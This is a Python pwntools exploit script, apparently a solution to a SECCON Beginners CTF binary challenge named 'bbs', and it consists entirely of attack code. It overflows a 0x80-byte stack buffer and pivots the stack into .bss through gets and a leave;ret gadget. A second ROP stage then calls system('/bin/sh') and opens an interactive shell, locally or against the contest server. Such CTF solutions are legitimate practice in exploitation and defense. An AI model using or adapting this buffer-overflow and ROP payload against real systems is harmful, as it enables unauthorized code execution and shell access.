#!/usr/bin/env python
from pwn import *

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./bbs_3e897818670a0db55eaed8109b6a73f0e03d54e7')
    else:
        s = remote('pwn1.chall.beginners.seccon.jp', 18373)

    pop_rdi = 0x400763
    leave_ret = 0x4006f8

    elf = ELF('./bbs_3e897818670a0db55eaed8109b6a73f0e03d54e7')
    payload = ''
    payload += 'A' * 0x80
    payload += p64(elf.bss(0x500 - 0x8))
    payload += p64(pop_rdi) + p64(elf.bss(0x500))
    payload += p64(elf.symbols['gets'])
    payload += p64(leave_ret)
    s.sendline(payload)

    payload = ''
    payload += p64(pop_rdi) + p64(elf.bss(0x518))
    payload += p64(elf.symbols['system'])
    payload += '/bin/sh\0'
    pause()
    s.sendline(payload)
    s.interactive()
